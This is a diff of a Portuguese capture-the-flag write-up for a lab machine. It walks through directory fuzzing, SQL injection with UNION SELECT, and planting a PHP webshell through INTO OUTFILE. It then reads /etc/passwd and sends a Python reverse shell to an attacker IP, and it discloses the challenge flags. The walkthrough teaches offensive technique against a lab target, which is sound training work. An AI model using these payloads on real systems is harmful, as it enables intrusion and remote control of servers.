@@ -592,13 +592,15 @@ Explicando os parâmetros:
 **Resultado do scan:**
 ```
 PORT   STATE SERVICE VERSION
-22/tcp open  ssh     OpenSSH 7.x
-80/tcp open  http    Apache httpd 2.4.x
+80/tcp open  http    Apache httpd 2.4.46 (() PHP/7.4.15)
 ```
+<img width="50%" alt="image" src="https://github.com/user-attachments/assets/3f7278d7-4aa5-4e30-89a3-1df50cb958e8" />
 
-Temos SSH na porta 22 (provavelmente não vamos usar agora, precisaríamos de credenciais) e um servidor web Apache na porta 80. Vamos focar no web primeiro.
+Temos um servidor web Apache na porta 80.
 
-Acessando `http://172.16.0.48` no navegador, encontramos um portal de notícias. Parece um CMS ou sistema caseiro. Antes de sair clicando em tudo, vamos mapear os diretórios.
+Acessando `http://172.16.0.48` no navegador, encontramos um portal de notícias. Antes de sair clicando em tudo (ou enquanto), vamos mapear os diretórios.
+
+<img width="50%" alt="image" src="https://github.com/user-attachments/assets/99d4a758-d0e1-425a-bfbe-51bc1b22ce0f" />
 
 **Fuzzing de diretórios com ffuf:**
 
@@ -606,7 +608,12 @@ Acessando `http://172.16.0.48` no navegador, encontramos um portal de notícias.
 ffuf -u http://172.16.0.48/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -c
 ```
 
-O `-c` é pra colorir a saída e facilitar a visualização. Usei a wordlist do dirbuster que é bem completa.
+A ideia aqui é descobrir caminhos/diretórios dessa aplicação, que é uma etapa importante de reconhecimento do alvo.
+
+Utilizaremos o `ffuf` para fazer o fuzzing utilizando uma wordlist do dirbuster, pois já temos no nosso Kali e é bem completa.
+
+Coloque o `-u` para o target (<URL>/FUZZ) e o `-w` para a wordlist. Já o `-c` é opcional, gosto de por para colorir a saída e facilitar a visualização.
+> Não esquecer de por o `FUZZ` na URL, local onde irá colocar cada elemento da wordlist nos testes.
 
 **Resultado interessante:**
 ```
@@ -617,23 +624,82 @@ index.php               [Status: 200, Size: xxx]
 
 O scan nos retorna dois diretórios interessantes: `/admin` e `/includes`.
 
-Aqui entra a malícia do atacante. O diretório `/admin` pede login e senha - testamos o clássico `admin:admin`, `admin:password`, mas nada funciona. É um beco sem saída por enquanto.
+<img width="50%" alt="image" src="https://github.com/user-attachments/assets/017ab26e-3c2b-4df1-bfba-58a450e4183e" />
 
-Porém, o diretório `/includes` brilha aos nossos olhos. Em servidores Apache, pastas com nomes como "includes", "uploads" ou "assets" frequentemente possuem **permissões de escrita (777) mal configuradas** para que o site possa salvar arquivos temporários ou uploads de usuários. Se acessarmos `http://172.16.0.48/includes/` diretamente e conseguirmos ver o conteúdo (ou não recebermos 403 Forbidden), é um bom sinal. Guardamos essa informação com carinho, pois ela pode ser nossa porta de entrada.
+Aqui entra a malícia do atacante. O diretório `/admin` pede login e senha - testamos, mas nada funcionou e nem estou querendo fazer brute force. É um beco sem saída por enquanto.
+
+Porém, o diretório `/includes` brilha aos nossos olhos. Em servidores Apache, pastas com nomes como "includes", "uploads" ou "assets" frequentemente possuem **permissões de escrita (777) mal configuradas** para que o site possa salvar arquivos temporários ou uploads de usuários. Se acessarmos `http://172.16.0.48/includes/` diretamente e conseguirmos ver o conteúdo (ou não recebermos 403 Forbidden), é um bom sinal, então vamos testar:
+
+<img width="30%" alt="image" src="https://github.com/user-attachments/assets/c5c8eb5a-195c-4de2-b8ab-a1eacfb313ad" />
+
+Yep! Guardaremos essa informação com carinho, pois ela pode ser útil como porta de entrada.
 
 ### Fase 2: Encontrando o SQLi e Primeira Flag
 
-Voltamos à página principal e começamos a explorar as funcionalidades. Tem uma barra de busca de notícias. Hora de testar.
+Voltamos à página principal e começamos a explorar as funcionalidades. Tem uma barra de busca de notícias. 
+
+Pegando o exemplo como este, um portal de notícia, quando um usuário pesquisa por uma delas, este input é processado e colocado numa query que é enviada ao banco, para que ele retorne o resultado de sua pesquisa.
+
+Já falamos sobre pensarmos no banco de dados como uma planilha/tabela de excel padrão que armazena conteúdo da plataforma. Assim sendo, quando você pesquisa algo como "states", está basicamente falando "`Me mande quaisquer resultados de notícia que contenha a palavra 'states'`". Ao testarmos no site, veremos que mostrará notícias relacionadas com a palavra-chave (ao menos em título) na aba de pesquisa.  
+
+Então, a query deve ficar mais ou menos assim (seguirá essa lógica):
+
+```sql
+SELECT * FROM news WHERE title LIKE '%states%';
+# ou  SELECT title FROM news WHERE title LIKE '%states%';
+```
+
+Agora precisamos saber se a gente consegue injetar código neste campo e alterar a query de alguma forma. Geralmente, quando tentamos identificar um SQLi via error, podemos colocar uma aspas simples. Dando erro, o SQLi é certo, já que a query ficaria assim:
+
+```sql
+SELECT * FROM news WHERE title LIKE '%'%';
+```
+
+Fechou a aspas, mas continuou o restante da query `%';`, o que culminaria em erro de SQL.
+
+Hora de testar.
 
 **Teste inicial:**
+
 Digitamos uma aspa simples (`'`) no campo de busca e clicamos em pesquisar.
 
-**Resposta:**
-A página mostra um comportamento estranho ou erro. Interessante: se fizermos uma busca inválida qualquer, já conseguimos ver uma mensagem diferente. Na verdade, qualquer pesquisa que resulte em erro de query já revela a **primeira flag**:
+**Interessante**: Não deu erro, foi como uma busca errada normal. 
+
+Porém, se fizermos uma busca inválida qualquer, já conseguimos ver **uma mensagem diferente** e bem importante para a gente. 
+
+<img width="25%" alt="image" src="https://github.com/user-attachments/assets/ae824e5d-210c-4463-b7f4-e673a5e7b792" />
+
+Então, qualquer pesquisa que resulte em erro de query já revelaria a **primeira flag** mesmo:
 
 > **Flag 1:** `uhc{1nv4l1d_s3arch_qu3ry}`
 
-Mas vamos além. Precisamos confirmar o SQLi e explorar.
+Mas vamos além, precisamos confirmar o SQL Injection para explorá-lo.
+
+**Descobrindo SQLi de forma básica:**
+
+A melhor e mais prática forma de testar, nesse caso, seria abusarmos da lógica matemática para uma condicional simples e irrefutável.
+
+Uma lógica matemática que sempre será verdadeira, como 1=1, pode ser utilizado para alterarmos a query e termos o resultado que queremos. Para isso precisaríamos começar com aspas para fechar o `'%` e não podemos esquecer de comentar o resto da query, se não ficará invalido novamente e veremos a tela de 'not found' com a primeira flag.
+
+Então, se digitarmos `' OR 1=1#`, a query ficaria mais ou menos assim:
+
+<img width="15%" alt="image" src="https://github.com/user-attachments/assets/4dad3a65-5138-49bb-a726-0b0206e2bf78" />
+
+```sql
+SELECT * FROM news WHERE title LIKE '%' OR 1=1#%';
+# ou  SELECT title FROM news WHERE title LIKE '%' OR 1=1#%';
+```
+> Estou supondo que a tabela aonde tem as notícias se chama `news`
+
+Nesse caso, o `WHERE` vai acabar sempre sendo positivo. 
+
+A mensagem ficou algo como "**Me mostre todas as noticias se o título é algo/vazio ou se 1 for igual a 1**", e como 1 sempre será igual a 1, então ele vai mostrar as notícias todas. 
+
+**Resultado:**
+
+<img width="50%" alt="image" src="https://github.com/user-attachments/assets/0d7041be-ca1f-4cd9-ada4-f61a6f6a2289" />
+
+Printou realmente todas as notícias! SQLi confirmado!!
 
 **Descobrindo o número de colunas com ORDER BY:**
 
@@ -660,19 +726,31 @@ Descobri que a query tem **7 colunas**. Agora preciso confirmar com UNION SELECT
 ' union select 1,2,3,4,5,6,7#     -- Funciona!
 ```
 
-Quando a página carrega, olho onde os números aparecem. No caso da Lion, o número **2** aparece claramente no lugar onde antes tinha o título da notícia da aba de busca. Isso significa que a **coluna 2 é a visível** - é lá que vou injetar minhas queries pra extrair dados.
+A query de pesquisa acabou ficando mais ou menos assim:
+
+```sql
+SELECT * FROM news WHERE title LIKE '%' union select 1,2,3,4,5,6,7#%';
+```
+
+Quando a página carrega, olharemos onde os números aparecem. 
+
+O número **2** aparece claramente no lugar onde antes tinha o título da notícia da aba de busca. Isso significa que a **coluna title** (única visível) está com conteúdo `2` (que adicionamos por ser a segunda coluna).
+
+Perceba que é nessa **posição 2** que vou injetar minhas queries com objetivo de extrair dados, visto que os outros números (1, 3, 4, 5, 6, 7) são só preenchimento pra manter as 7 colunas necessárias para o `union` funcionar (visto que não dá para unir duas tabelas com colunas diferentes/incompatíveis).
 
 **Reconhecimento do ambiente:**
 
-Agora que sei que a coluna 2 é a visível, vou usá-la pra extrair informações. Primeiro, descubro o nome do banco:
+Primeiro, descubro o nome do banco:
 
 ```sql
 ' union select 1,database(),3,4,5,6,7#
 ```
 
-Veja que coloquei `database()` na **posição 2** - que é onde os dados aparecem na tela. Os outros números (1, 3, 4, 5, 6, 7) são só preenchimento pra manter as 7 colunas necessárias.
+Descobrimos que na verdade é o próprio banco de dados que se chama `news` (quem diria kk).
 
-Descobrimos que o banco de dados se chama `news`.
+Podemos usar outros comandos como `user()` ou `@@version` e por aí vai.
+
+<img width="45%" alt="image" src="https://github.com/user-attachments/assets/cb186761-1387-492b-aba1-8998a8c905cf" />
 
 **Enumerando as tabelas:**
 
@@ -743,10 +821,14 @@ Primeiro, vamos verificar se temos acesso ao diretório `/includes`. Acessando `
 
 Esse código PHP pega o parâmetro `cmd` da URL e executa como comando do sistema operacional.
 
+<img width="20%" alt="image" src="https://github.com/user-attachments/assets/b2005116-f0f5-41a7-ba9d-b315ab7f1403" />
+
 **Preparamos o payload no campo de busca:**
 
+<img width="20%" alt="image" src="https://github.com/user-attachments/assets/140d72c9-aa08-431e-9f2a-957d60db8cc6" />
+
 ```sql
-' union select 1,"<?php system($_GET['cmd']); ?>",3,4,5,6,7 into outfile "/var/www/html/includes/cmd.php"#
+' union select 1,"<?php system($_GET['cmd']); ?>",3,4,5,6,7 into outfile "/var/www/html/includes/teteu.php"#
 ```
 
 Algumas observações:
@@ -754,11 +836,15 @@ Algumas observações:
 - O caminho `/var/www/html/` é o padrão do Apache no Linux
 - Escolhemos a pasta `/includes/` porque verificamos que temos acesso a ela
 
-Se a query for executada sem erro, nosso arquivo foi criado!
+Se a query for executada - mesmo se der o erro not found -, nosso arquivo provavelmente foi criado!
 
 **Testando se funcionou:**
 
-Acessamos: `http://172.16.0.48/includes/cmd.php?cmd=id`
+Entrando em `includes` novamente, agora vemos o `teteu.php` que criamos.
+
+<img width="20%" alt="image" src="https://github.com/user-attachments/assets/73147596-a47a-45a6-a6f0-f50f0790b709" />
+
+Acessamos: `http://172.16.0.48/includes/teteu.php?cmd=id`
 
 Resposta na tela (no lugar onde apareceria o número 2): `uid=48(apache) gid=48(apache) groups=48(apache)`
 
@@ -767,10 +853,11 @@ Resposta na tela (no lugar onde apareceria o número 2): `uid=48(apache) gid=48(
 **Explorando um pouco:**
 
 ```
-http://172.16.0.48/includes/cmd.php?cmd=whoami     # apache
-http://172.16.0.48/includes/cmd.php?cmd=pwd        # /var/www/html/includes
-http://172.16.0.48/includes/cmd.php?cmd=ls -la /home   # ver usuários
-http://172.16.0.48/includes/cmd.php?cmd=cat /etc/passwd  # listar todos usuários
+http://172.16.0.48/includes/teteu.php?cmd=whoami     # apache
+http://172.16.0.48/includes/teteu.php?cmd=pwd        # /var/www/html/includes
+http://172.16.0.48/includes/teteu.php?cmd=cat /etc/passwd
+http://172.16.0.48/includes/teteu.php?cmd=ls -la /home 
+http://172.16.0.48/includes/teteu.php?cmd=ls -la / # acharemos a flag, podemos até já pegar ela por aqui com cat /flag.txt
 ```
 
 Vemos que existe um usuário chamado `lion` além do root. Provavelmente a flag de usuário está no home dele.
@@ -799,18 +886,19 @@ Explicando os parâmetros:
 
 Na webshell, testamos:
 ```
-http://172.16.0.48/includes/cmd.php?cmd=which python
+http://172.16.0.48/includes/teteu.php?cmd=which python
 ```
 
-Se retornar `/usr/bin/python`, temos Python disponível. Caso contrário, tente `which python3` ou at´r `whereis python`. Em situações sem python, geralmente podemos fazer através de script.
+Se retornar algo como `/usr/bin/python`, temos Python disponível. Pode tentar também pelo comando `whereis python`. Em situações sem python, geralmente podemos fazer com script ou algo disponível.
 
 **Enviando a reverse shell:**
 
-Vamos usar Python pra criar a conexão reversa. O payload clássico:
+Vamos usar Python pra criar a conexão reversa. O payload clássico (revshells.com pode ser útil para copiar payloads prontas):
 
 ```
-http://172.16.0.48/includes/cmd.php?cmd=python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.30.175",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;pty.spawn("sh")'
+http://172.16.0.48/includes/teteu.php?cmd=python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.30.175",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;pty.spawn("sh")'
 ```
+> Existem situações (como terá em outra máquina mais difícil) que este tipo de payload não vai funcionar sem URL-Encode. Dessa vez podemos só passar mesmo que funciona.
 
 Explicando o payload Python:
 1. `socket.socket()` - Cria um socket de rede
@@ -831,18 +919,49 @@ sh-4.2$
 
 Estamos dentro da máquina com um shell!
 
->Ainda bem que não precisou de URL Encode, em muitas situações pode ser que o payload clean assim não funcione, mas não significando que esteja seguro, apenas precisando dessa "tradução" para funcionar.
 
 ### Fase 6: Upgrade para Shell Interativa (TTY)
 
-O shell que recebemos é bem "cru". Se tentarmos usar `su` (switch user), `nano`, `vim`, ou outros comandos interativos (até mesmo se tentarmos utilizar as SETAS do teclado), vai dar errado... pode dar algum erro tipo "must be run from a terminal" ou de variável de ambiente. Isso acontece porque não temos um TTY (TeleTYpewriter) real - é só um pipe de dados.
+Quando a gente ganha um shell "cru", ele costuma funcionar para comandos simples, mas falha em programas interativos. Por exemplo: `su`, `sudo`, `vim`, `nano`, `top`, uso de setas, Tab, Ctrl+C/Ctrl+Z etc.  
+Isso acontece porque a sessão não está ligada a um **terminal** (TTY/PTY). Em vez de um terminal de verdade controlando entrada/saída, você só tem um **fluxo de dados** (stdin/stdout), como um pipe.
 
-**O que é um TTY?**
+Pensa assim: conversar por **SMS** é só texto indo e voltando. Já conversar por um app "completo", como WhatsApp, é mais interativo e tem recursos extras: como microfone, ligação em vídeo, etc.  
+No Linux, um **TTY/terminal** é esse "modo completo" de conversa com o sistema: não é só texto, existe um conjunto de regras e recursos de interação.
 
-TTY é uma abstração do kernel Linux que simula um terminal físico. Comandos como `su`, `sudo`, e editores de texto precisam de um TTY para funcionar porque eles precisam de funcionalidades como:
-- Ler senhas sem mostrar na tela
-- Usar teclas especiais (Ctrl+C, setas, tab)
-- Ter um terminal de tamanho definido
+> **TTY/terminal** no Linux: além de texto, ele fornece edição de linha, teclas especiais, sinais e modos de operação. Em outras palavras, é como usar um terminal de verdade com todas as regras e recursos de interação.
+
+#### Sem TTY vs Com TTY
+
+Em uma situação **"Sem TTY"** (Sem terminal), estamos falando só de entrada/saída. Funciona para `ls`, `cat`, `id`, mas falha quando o usuário precisa de interatividade (como usar as setas) ou quando o programa precisa controlar o terminal.
+
+Já **"Com TTY"** (Com terminal), o programa ganha interatividade completa, com:
+- leitura de senha **sem eco** (não mostrar o que digita)
+- teclas especiais (setas, Tab, Ctrl+L etc.)
+- **sinais e job control** (Ctrl+C interrompe, Ctrl+Z suspende, foreground/background)
+- noção de tamanho do terminal (linhas/colunas) e capacidades via `TERM`
+
+> TTY representa um terminal interativo mais "real", enquanto que PTY representa um terminal virtual realmente emulado.
+
+#### TTY vs PTY: entendendo de uma vez por todas
+
+Aqui vem a parte que confunde todo mundo, mas vou explicar de um jeito que você não esquece mais.
+
+No Linux existem **dois tipos de terminal**: **TTY** e **PTY**. Os dois fazem a mesma coisa (fornecem terminal interativo pro programa), mas vêm de lugares diferentes.
+
+**TTY (TeleTYpewriter/Teletype)** é um terminal **ligado diretamente ao sistema**. Pensa naqueles terminais que você acessa com Ctrl+Alt+F1, F2, etc. — são os consoles do Linux (tipo `/dev/tty1`, `/dev/tty2`). Eles existem "de verdade" no sistema, gerenciados direto pelo kernel, sem precisar de programa intermediário. É o terminal mais "raiz" que existe.
+
+**PTY (Pseudo-Terminal)** é um terminal **criado por software**. Ele não existe fisicamente — é fabricado por um programa. Funciona assim: existe um **par de dispositivos** (master e slave). O **master** é controlado por algum programa (tipo SSH, tmux, ou aquele terminal gráfico que você abre no Ubuntu), e o **slave** (ex.: `/dev/pts/3`) é o que o programa "lá dentro" enxerga como seu terminal. 
+
+**Analogia**: TTY é como um telefone fixo ligado direto na central telefônica. PTY é ligação pelo WhatsApp. Funciona igual pra você, mas por trás tem um programa simulando a ligação.
+
+**Exemplo prático**: quando você abre o terminal gráfico no Linux (gnome-terminal, xterm, etc.), ele **não te dá um TTY direto**. O que acontece é: o programa cria um **PTY** — ele controla o lado master, e o bash que roda dentro enxerga o slave (`/dev/pts/3`) como seu terminal. Do ponto de vista do bash, ele **tem um terminal completo** (pode usar setas, Ctrl+C, etc.), mas esse terminal foi **fabricado via software** pelo PTY.
+
+**Resumindo de forma certeira**:
+- **TTY** = terminal "direto" do sistema (console físico/kernel, como `/dev/tty1`)
+- **PTY** = terminal "virtual" criado por software (par master/slave, como `/dev/pts/3`)
+- Ambos fornecem **a mesma interface de terminal** pro programa — a diferença é **de onde vem** o terminal
+
+> **Em poucas palavras**: TTY é terminal direto do sistema. PTY é terminal criado por software. Ambos funcionam igual pro programa que está usando
 
 **Spawning um PTY (Pseudo-TTY) com Python:**
 
@@ -873,9 +992,9 @@ export SHELL=/bin/bash  # Opcional: define bash como shell padrão para subproce
 
 **Entendendo o comando `stty`:**
 
-O `stty` (Set TTY) é um comando que configura as opções do seu terminal. Ele controla como o terminal processa os caracteres que você digita. Vamos entender cada parte:
+O `stty` (podemos pensar como `Set TTY`) é um comando que configura as opções do seu terminal. Ele controla como o terminal processa os caracteres que você digita. Vamos entender cada parte:
 
-- **`stty`** = O comando em si - "Set Terminal TYpe" - serve para configurar características do terminal
+- **`stty`** = Como já falamos acima, o comando em si serve para configurar características do terminal
 - **`raw`** = Modo "cru" - desabilita todo o processamento de input do terminal local. Normalmente, quando você digita Ctrl+C, seu terminal local intercepta e envia um sinal de interrupção. No modo raw, TUDO que você digita é passado direto para o programa (no caso, a conexão remota). Isso permite que Ctrl+C, Tab, setas funcionem no shell remoto em vez de serem capturados localmente.
 - **`-echo`** = Desabilita o "eco" local. Quando você digita algo, normalmente seu terminal mostra o que você digitou (eco). Com `-echo`, ele não mostra - isso evita que você veja os caracteres duplicados (uma vez pelo terminal local, outra vez pelo remoto).
 - **`;`** = Separador de comandos - executa o próximo comando em sequência
@@ -903,6 +1022,8 @@ ls -la /
 Encontramos um arquivo com a segunda flag!!
 
 Podemos usar o `cat /flag.txt` para vermos o resultado e já partir para elevação de privilégio em busca da próxima flag.
+
+<img width="25%" alt="image" src="https://github.com/user-attachments/assets/472545cd-2286-4e0b-a0ff-c594dff55a68" />
 
 > **Flag 2:** `uhc{Sql_1nj3ct10n_34sy}`
 
@@ -1246,7 +1367,7 @@ Completamos a máquina! 🎉
 2. **Flag 1** - Erro de busca: `uhc{1nv4l1d_s3arch_qu3ry}`
 3. **SQLi com UNION** - Descobrimos 7 colunas com ORDER BY e UNION SELECT
 4. **Enumeração do banco** - Extraímos nome do banco, tabelas, colunas e hash Bcrypt
-5. **RCE via INTO OUTFILE** - Criamos webshell em `/includes/cmd.php`
+5. **RCE via INTO OUTFILE** - Criamos webshell em `/includes/teteu.php`
 6. **Reverse Shell** - Python payload para conexão reversa
 7. **TTY Upgrade** - Shell interativa com `stty raw -echo`
 8. **Flag 2** - SQL Injection funcionando: `uhc{Sql_1nj3ct10n_34sy}`
